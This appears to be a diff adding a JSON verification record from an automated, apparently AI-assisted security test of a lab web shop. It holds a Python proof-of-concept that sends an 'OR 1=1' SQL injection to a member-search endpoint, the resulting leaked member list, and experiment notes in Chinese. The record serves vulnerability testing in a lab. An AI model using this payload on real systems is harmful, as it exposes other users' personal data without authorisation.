@@ -1,0 +1,136 @@
+{
+  "finding_id": "6ea737d111da4451a1c0cbab2c63aa92",
+  "verification_id": "b9a479ce0a054a29aa015a892bc98455",
+  "job": {
+    "job_id": "5bca6c029e9148fcbd3b9e30be055dac",
+    "kind": "script",
+    "context_id": "operator-d080e73f70b14490be1e1cdf6b452385",
+    "identity": "operator",
+    "precondition": {
+      "ok": true,
+      "identity": "operator",
+      "expected_role": "operator",
+      "actual": {
+        "id": 3,
+        "username": "operator",
+        "role": "operator",
+        "balance": "100.00",
+        "tier": "standard",
+        "nickname": "operator",
+        "homepage": "#"
+      },
+      "status": 200,
+      "reason": "",
+      "expected_state": {}
+    },
+    "request": {
+      "language": "python",
+      "script": "import os,json,urllib.request,urllib.parse,http.cookiejar\nbase=os.environ['LAB30_URL'].rstrip('/')\njar=http.cookiejar.CookieJar();op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))\nop.open(base+'/auth/login.php',timeout=10).read()\nop.open(base+'/auth/login.php',data=urllib.parse.urlencode({'username':os.environ['LAB30_USER'],'password':os.environ['LAB30_PASSWORD']}).encode(),timeout=10).read()\ndef get(q):\n r=op.open(urllib.request.Request(base+'/ops/members.php?'+urllib.parse.urlencode({'q':q}),headers={'Accept':'application/json'}),timeout=10)\n return r.status,json.loads(r.read())\nnormal_status,normal=get('alice');print('CONTROL',normal_status,json.dumps(normal,sort_keys=True))\nattack_status,attack=get(\"' OR 1=1 -- \");print('ATTACK',attack_status,json.dumps(attack,sort_keys=True))\nprint('CONTROL_USERS',[x.get('username') for x in normal.get('members',[])])\nprint('ATTACK_USERS',[x.get('username') for x in attack.get('members',[])])\nassert normal_status==200 and attack_status==200\nassert len(attack['members'])>len(normal['members'])\nassert any(x.get('username')=='bob' for x in attack['members'])\nprint('SQL_STRUCTURE_CHANGED_CONFIRMED')\n",
+      "script_sha256": "e7beb3250edbbbc167a45a935787853c9bf9593cf182242f98c36363266dba7a"
+    },
+    "result": {
+      "status": "finished",
+      "exit_code": 0,
+      "duration_ms": 352,
+      "stdout": "CONTROL 200 {\"members\": [{\"email\": \"attacker-csrf@13160.example.com\", \"id\": 1, \"role\": \"customer\", \"username\": \"alice\"}]}\nATTACK 200 {\"members\": [{\"email\": \"attacker-csrf@13160.example.com\", \"id\": 1, \"role\": \"customer\", \"username\": \"alice\"}, {\"email\": \"bob@shop.local\", \"id\": 2, \"role\": \"customer\", \"username\": \"bob\"}, {\"email\": \"ops@shop.local\", \"id\": 3, \"role\": \"operator\", \"username\": \"operator\"}, {\"email\": \"admin@shop.local\", \"id\": 4, \"role\": \"admin\", \"username\": \"admin\"}]}\nCONTROL_USERS ['alice']\nATTACK_USERS ['alice', 'bob', 'operator', 'admin']\nSQL_STRUCTURE_CHANGED_CONFIRMED\n",
+      "stderr": "",
+      "timed_out": false
+    },
+    "exit_code": 0,
+    "duration_ms": 352,
+    "artifacts": []
+  },
+  "result": {
+    "status": "verified",
+    "verdict": "confirmed",
+    "summary": "operator 对成员查询的 q 注入改写 SQL 条件，返回 alice 搜索以外的 bob 等成员数据。",
+    "normal_observation": "同一 operator 会话 q=alice 返回仅含 alice 的单行成员记录。",
+    "attack_observation": "仅将 q 改为引号+OR 1=1+注释，200 返回多名成员且包含 bob；原筛选条件被改变。",
+    "browser_execution": false,
+    "adapted_script": "",
+    "modification_notes": "",
+    "command": "",
+    "evidence_notes": "",
+    "artifacts": [],
+    "jobs": [
+      "5bca6c029e9148fcbd3b9e30be055dac"
+    ],
+    "normal_evidence": [
+      {
+        "job_id": "5bca6c029e9148fcbd3b9e30be055dac",
+        "channel": "stdout",
+        "excerpt": "CONTROL 200 {\"members\": [{\"email\": \"attacker-csrf@13160.example.com\", \"id\": 1, \"role\": \"customer\", \"username\": \"alice\"}]}"
+      }
+    ],
+    "attack_evidence": [
+      {
+        "job_id": "5bca6c029e9148fcbd3b9e30be055dac",
+        "channel": "stdout",
+        "excerpt": "ATTACK 200 {\"members\": [{\"email\": \"attacker-csrf@13160.example.com\", \"id\": 1, \"role\": \"customer\", \"username\": \"alice\"}, {\"email\": \"bob@shop.local\", \"id\": 2, \"role\": \"customer\", \"username\": \"bob\"}, {\"email\": \"ops@shop.local\", \"id\": 3, \"role\": \"operator\", \"username\": \"operator\"}, {\"email\": \"admin@shop.local\", \"id\": 4, \"role\": \"admin\", \"username\": \"admin\"}]}"
+      }
+    ],
+    "experiment": {
+      "security_property": "搜索值只能作为用户名匹配数据，不得改变查询结构或扩大成员数据集",
+      "attacker_identity": "operator",
+      "resource_owner": "被查询的 alice、bob 等商城会员",
+      "initial_state": "复位后的测试种子成员数据，已核实 operator 角色，普通搜索与攻击保持同一会话。",
+      "preconditions": [
+        "合法 operator/admin 会话可访问成员搜索"
+      ],
+      "control": "q=alice 正常搜索只匹配 alice",
+      "attack_variable": "仅改变 q 为 SQL 条件拼接载荷",
+      "expected_discriminator": "若有参数绑定或转义，载荷只作字面搜索，不应返回所有成员",
+      "observed_discriminator": "正常仅一人，注入返回多名成员含 bob，证明拼接改写 SQL 结构；不主张写数据库或文件能力。",
+      "effect_kind": "read",
+      "normal_job_ids": [
+        "5bca6c029e9148fcbd3b9e30be055dac"
+      ],
+      "attack_job_ids": [
+        "5bca6c029e9148fcbd3b9e30be055dac"
+      ],
+      "readback_job_ids": [],
+      "limitations": [
+        "需要 operator/admin 会话；只验证 SELECT 读取影响。"
+      ]
+    }
+  },
+  "prepared": {
+    "ok": true,
+    "context_id": "operator-d080e73f70b14490be1e1cdf6b452385",
+    "identity": "operator",
+    "base_url": "http://lab30",
+    "version": "lab30-shop-1.0.0",
+    "user": "operator",
+    "authenticated": true,
+    "precondition": {
+      "ok": true,
+      "identity": "operator",
+      "expected_role": "operator",
+      "actual": {
+        "id": 3,
+        "username": "operator",
+        "role": "operator",
+        "balance": "100.00",
+        "tier": "standard",
+        "nickname": "operator",
+        "homepage": "#"
+      },
+      "status": 200,
+      "reason": "",
+      "expected_state": {}
+    },
+    "state_changes": [],
+    "prepared_at": "2026-11-11T02:55:40Z"
+  },
+  "reset_performed": false,
+  "actor": "codex-user-assisted-poc",
+  "at": "2026-11-11T02:55:40.910400+00:00",
+  "context_closure": {
+    "context_id": "operator-d080e73f70b14490be1e1cdf6b452385",
+    "state": "closed",
+    "active": 0,
+    "pending_jobs": 0,
+    "was_unknown": false,
+    "charged_active_ms": 2000
+  }
+}
